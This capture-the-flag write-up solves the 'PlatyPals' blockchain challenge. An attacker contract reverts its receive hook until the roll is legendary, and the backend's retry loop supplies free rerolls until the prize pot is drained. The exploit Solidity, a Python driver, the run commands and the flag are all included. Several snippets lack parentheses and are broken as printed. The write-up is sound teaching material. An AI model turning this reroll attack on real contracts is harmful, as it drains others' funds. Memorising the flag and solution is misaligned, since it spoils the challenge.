---
title: "PlatyPals"
ctf: "platypwnies 2026"
date: 2026-11-14
category: blockchain
difficulty: 2
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{r3r0ll_unt1l_l3g3nd4ry::YtgUAPznRLEk}"
---

# PlatyPals

## Summary

`Chal` uses a proper CSPRNG for box rolls (`secrets.randbelow(100)`, 1% legendary), so
gambling at 1 ETH/box for a 50 ETH buyback is a guaranteed loss. The bug is in the **backend
retry loop**: `service/box_opener.py` retries any batch whose transaction reverted, and
generates *fresh* rolls for each retry. `Chal.openBoxes` calls
`IPalReceiver(owner).onPalReceived(id, rarity)` on contract owners, so a contract owner can
**revert unless the roll was legendary**. The whole batch reverts (nothing consumed), the
backend retries with new rolls, and the ~1-in-100 event is hit for free after ~100 attempts.
Every accepted box is a guaranteed legendary → 50 ETH buyback.

Win condition: `Setup.isSolved` → `address(TARGET).balance < 10 ether` (100 ETH pot,
50 ETH per legendary, so 2 legendaries suffice).

## Solution / Exploit

Source: `contracts/Chal.sol`, `contracts/Setup.sol`, `service/box_opener.py`; attacker
contract `PlatyPalsSniper.sol`; driver `platypals_exploit.py`.

### Step 1 — the roll, and the hook

```solidity
uint8 rarity = rolls[i] == 0 ? LEGENDARY : rolls[i] < 10 ? EPIC : rolls[i] < 40 ? RARE : COMMON;
pals[owner][rarity]++;
emit BoxOpened(id, owner, rarity);

// pals can live in smart contract wallets too, make sure they are welcome there
if (owner.code.length > 0) {
 require(
 IPalReceiver(owner).onPalReceived(id, rarity) == IPalReceiver.onPalReceived.selector,
 "Pal not accepted"
 );
}
```

Any revert inside `onPalReceived` reverts the entire `openBoxes` transaction, so
`nextUnopened` does not advance and no box is consumed.

### Step 2 — the retry loop delivers free rerolls

```python
rolls = [secrets.randbelow(100) for _ in range(min(unopened, BATCH_SIZE))]
receipt = w3.eth.waitForTransactionReceipt(w3.eth.sendRawTransaction(signed.rawTransaction))
if receipt.status != 1:
 logging.warning("Opening %s boxes failed, trying again", len(rolls))
```

Fresh `secrets.randbelow(100)` per retry. The sniper reverts for anything that is not
LEGENDARY (`rolls[i] == 0`), so the backend keeps rerolling until it rolls 0:

```solidity
function onPalReceived(uint256, uint8 rarity) external returns (bytes4) {
 require(msg.sender == address(chal), "only chal");
 // not a legendary? blow up the whole batch -> backend rerolls for free
 require(rarity == LEGENDARY, "reroll please");
 return this.onPalReceived.selector;
}
```

### Step 3 — the sniper contract

`PlatyPalsSniper.sol` (compiled bytecode is embedded in the Python driver, so no `solc` is
needed at run time):

```solidity
function buy external {
 require(msg.sender == owner, "owner only");
 chal.buyBox{value: 1 ether};
}

function cashout external {
 require(msg.sender == owner, "owner only");
 if (chal.pals(address(this), LEGENDARY) > 0) {
 chal.sellLegendary;
 }
 uint256 bal = address(this).balance;
 if (bal > 0) { payable(owner).transfer(bal); }
}
```

### Step 4 — drive it

Per round: deploy the sniper once, fund it with 1 ETH, call `buy` (owns exactly one box),
then poll `pals(sniper, 3)` until the backend's reroll finally produces a legendary, then
`cashout` (`sellLegendary` → +50 ETH forwarded to the player). Repeat until the target
balance drops below 10 ETH.

```python
sniper = deploy_sniper(w3, acct, target_addr, bytecode)
send(w3, acct, sniper.functions.buy)
while time.time - t0 < poll_timeout:
 if chal.functions.pals(sniper.address, 3).call > 0:
 break
 time.sleep(1)
send(w3, acct, sniper.functions.cashout)
```

~1% per attempt at ~2 attempts/second → a legendary every ~50 s on average. Default
`ROUNDS=3`, `POLL_TIMEOUT=900` s per legendary; 2 legendaries already push the pot below the
10 ETH threshold.

### Run

```bash
RPC_URL=http://127.0.0.1:8545/<uuid> \
PRIVATE_KEY=<player key> \
SETUP_ADDRESS=<setup addr> \
FLAG='PP{r3r0ll_unt1l_l3g3nd4ry::YtgUAPznRLEk}' \
python3 platypals_exploit.py
```

### Expected output

No raw run log was retained; below is the literal format of the script's `print` statements
(not a captured transcript).

```
[*] TARGET 0x... balance 100.0000 ETH
[+] sniper deployed at 0x... (owner 0x...)
[*] round 1: box bought, waiting for the backend to roll a legendary (it rerolls our reverts for free)...
[+] legendary after 63.4s
[*] sold legendary, TARGET balance 50.0000 ETH
[*] round 2: box bought, waiting ...
[+] legendary after 88.1s
[*] sold legendary, TARGET balance <10.0000 ETH
[+] isSolved = True
FLAG: PP{r3r0ll_unt1l_l3g3nd4ry::YtgUAPznRLEk}
```

(Timings are illustrative of the retry rate implied by the backend loop — one attempt per
~0.5 s — not a captured measurement.)

## Flag(s)

```
PP{r3r0ll_unt1l_l3g3nd4ry::YtgUAPznRLEk}
```

## Notes / Pitfalls

- **The RNG is fine; the retry loop is not.** `secrets.randbelow` is a CSPRNG. The
 vulnerability is purely the griefing primitive: "revert → backend rerolls with new entropy"
 converts a 1% event into a guaranteed loop, because the attacker is both player and oracle
 of acceptance.
- **Only contract owners are hooked.** `onPalReceived` is only called when `owner.code.length > 0`.
 An EOA owner gets no reroll — the attack *requires* a contract wallet.
- **Batch atomicity.** A revert kills the whole batch, so `nextUnopened` never advances and no
 ETH/boxes are consumed during failed rolls. That is why it is free.
- **One box per round keeps the logic simple.** The sniper buys exactly one box (it must hold
 ≥ 1 ETH), so "accepted" == "we got a legendary". Buying many would need per-box handling of
 the batch.
- **The embedded bytecode must match the deployed `Chal`.** The driver deploys
 `PlatyPalsSniper` from embedded creation bytecode (source in `PlatyPalsSniper.sol`,
 solc 0.8.20, `--evm-version paris --optimize`) — no local compiler needed.
